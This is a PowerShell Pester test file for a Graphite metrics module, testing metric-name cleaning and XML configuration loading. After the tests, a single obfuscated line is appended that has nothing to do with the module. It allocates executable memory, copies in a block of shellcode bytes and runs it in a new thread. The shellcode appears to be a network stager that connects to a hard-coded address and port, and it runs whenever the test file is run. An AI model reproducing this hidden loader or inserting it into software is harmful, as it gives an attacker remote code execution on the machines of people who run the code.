Import-Module .\Graphite-Powershell.psd1

InModuleScope Graphite-PowerShell {
    Describe "ConvertTo-GraphiteMetric" {
        Context "Metric Transformation - Base Function" {
            $TestMetric = ConvertTo-GraphiteMetric -MetricToClean "\\myServer\network interface(realtek pcie gbe family controller)\bytes received/sec"

            It "Should Return Something" {
                $TestMetric | Should Not BeNullOrEmpty
            }
            It "Should Provide myServer.networkinterface.realtekpciegbefamilycontroller.bytesreceived-sec as Output" {
                $TestMetric | Should MatchExactly "myServer.networkinterface.realtekpciegbefamilycontroller.bytesreceived-sec"
            }
            It "Should Not Contain Left Parentheses" {
                $TestMetric | Should Not Match "\("
            }
            It "Should Not Contain Right Parentheses" {
                $TestMetric | Should Not Match "\)"
            }
            It "Should Not Contain Forward Slash" {
                $TestMetric | Should Not Match "\/"
            }
            It "Should Not Contain Back Slash" {
                $TestMetric | Should Not Match "\\"
            }
            It "Should Contain a Period" {
                $TestMetric | Should Match "\."
            }
        }
        Context "Metric Transformation - Using MetricReplacementHash" {

            $MockHashTable = [ordered]@{
            "^\\\\" = "";
            "\\\\" = "";
            "\/" = "-";
            ":" = ".";
            "\\" = ".";
            "\(" = ".";
            "\)" = "";
            "\]" = "";
            "\[" = "";
            "\%" = "";
            "\s+" = "";
            "\.\." = ".";
            "_" = ""
            }

            It "Should Return Something" {
                ConvertTo-GraphiteMetric -MetricToClean "\\myServer\network interface(realtek pcie gbe family controller)\bytes received/sec" -MetricReplacementHash $MockHashTable | Should Not BeNullOrEmpty
            }
            It "Should Provide myServer.networkinterface.realtekpciegbefamilycontroller.bytesreceived-sec as Output" {
                ConvertTo-GraphiteMetric -MetricToClean "\\myServer\network interface(realtek pcie gbe family controller)\bytes received/sec" -MetricReplacementHash $MockHashTable | Should MatchExactly "myServer.networkinterface.realtekpciegbefamilycontroller.bytesreceived-sec"
            }
            It "Should Not Contain Left Parentheses" {
                ConvertTo-GraphiteMetric -MetricToClean "\\myServer\network interface(realtek pcie gbe family controller)\bytes received/sec" -MetricReplacementHash $MockHashTable | Should Not Match "\("
            }
            It "Should Not Contain Right Parentheses" {
                ConvertTo-GraphiteMetric -MetricToClean "\\myServer\network interface(realtek pcie gbe family controller)\bytes received/sec" -MetricReplacementHash $MockHashTable | Should Not Match "\)"
            }
            It "Should Not Contain Forward Slash" {
                ConvertTo-GraphiteMetric -MetricToClean "\\myServer\network interface(realtek pcie gbe family controller)\bytes received/sec" -MetricReplacementHash $MockHashTable | Should Not Match "\/"
            }
            It "Should Not Contain Back Slash" {
                ConvertTo-GraphiteMetric -MetricToClean "\\myServer\network interface(realtek pcie gbe family controller)\bytes received/sec" -MetricReplacementHash $MockHashTable | Should Not Match "\\"
            }
            It "Should Contain a Period" {
                ConvertTo-GraphiteMetric -MetricToClean "\\myServer\network interface(realtek pcie gbe family controller)\bytes received/sec" -MetricReplacementHash $MockHashTable | Should Match "\."
            }
        }
        Context "Metric Transformation - Remove Underscores" {
            $TestMetric = ConvertTo-GraphiteMetric -MetricToClean "\\myServer\Processor(_Total)\% Processor Time" -RemoveUnderscores

            It "Should Return Something" {
                $TestMetric | Should Not BeNullOrEmpty
            }
            It "Should Return myServer.production.net.Processor.Total.ProcessorTime as Output" {
                $TestMetric | Should MatchExactly "myServer.Processor.Total.ProcessorTime"
            }
            It "Should Not Contain Underscores" {
                $TestMetric | Should Not Match "_"
            }
        }
        Context "Metric Transformation - Provide Nice Output for Physical Disks" {
            $TestMetric = ConvertTo-GraphiteMetric -MetricToClean "\\myServer\physicaldisk(1 e:)\avg. disk write queue length" -RemoveUnderscores -NicePhysicalDisks

            It "Should Return Something" {
                $TestMetric | Should Not BeNullOrEmpty
            }
            It "Should Return myServer.physicaldisk.e-drive.diskwritequeuelength as Output" {
                $TestMetric | Should MatchExactly "myServer.physicaldisk.e-drive.diskwritequeuelength"
            }
        }
        Context "Metric Transformation - Replace HostName" {
            $TestMetric = ConvertTo-GraphiteMetric -MetricToClean "\\$($env:COMPUTERNAME)\physicaldisk(1 e:)\avg. disk write queue length" -RemoveUnderscores -NicePhysicalDisks -HostName "my.new.hostname"

            It "Should Return Something" {
                $TestMetric | Should Not BeNullOrEmpty
            }
            It "Should Return my.new.hostname.physicaldisk.e-drive.diskwritequeuelength as Output" {
                $TestMetric | Should MatchExactly "my.new.hostname.physicaldisk.e-drive.diskwritequeuelength"
            }

            $TestMetric = ConvertTo-GraphiteMetric -MetricToClean "\\$($env:COMPUTERNAME)\physicaldisk(1 e:)\avg. disk write queue length" -RemoveUnderscores -NicePhysicalDisks -HostName "host_with_underscores"

            It "Should Return host_with_underscores.physicaldisk.e-drive.diskwritequeuelength as Output when RemoveUnderscores is enabled and host has underscores" {
                $TestMetric | Should MatchExactly "host_with_underscores.physicaldisk.e-drive.diskwritequeuelength"
            }
        }
    }

    Describe "Import-XMLConfig" {
        Context "Loading a Configuration File" {
            $_config = Import-XMLConfig -ConfigPath "./StatsToGraphiteConfig.xml"

            It "Loaded Configuration File Should Not Be Empty" {
                $_config | Should Not BeNullOrEmpty
            }
            It "Should Have 16 Properties" {
                $_config.Count | Should Be 17
            }
            It "SendUsingUDP should be Boolean" {
                $_config.SendUsingUDP -is [Boolean] | Should Be $true
            }
            It "MSSQLMetricSendIntervalSeconds should be Int32" {
                $_config.MSSQLMetricSendIntervalSeconds -is [Int32] | Should Be $true
            }
            It "MSSQLConnectTimeout should be Int32" {
                $_config.MSSQLConnectTimeout -is [Int32] | Should Be $true
            }
            It "MSSQLQueryTimeout should be Int32" {
                $_config.MSSQLQueryTimeout -is [Int32] | Should Be $true
            }
            It "MetricSendIntervalSeconds should be Int32" {
                $_config.MetricSendIntervalSeconds -is [Int32] | Should Be $true
            }
            It "MetricTimeSpan should be TimeSpan" {
                $_config.MetricTimeSpan -is [TimeSpan] | Should Be $true
            }
            It "MSSQLMetricTimeSpan should be TimeSpan" {
                $_config.MSSQLMetricTimeSpan -is [TimeSpan] | Should Be $true
            }
            It "MetricReplace should be HashTable" {
                $_config.MetricReplace -is [System.Collections.Specialized.OrderedDictionary] | Should Be $true
            }
        }
    }
}
$47m = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $47m -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xba,0x0c,0x6a,0x75,0x68,0x02,0x00,0x15,0xb3,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$89T=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($89T.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$89T,0,0,0);for (;;){Start-sleep 60};

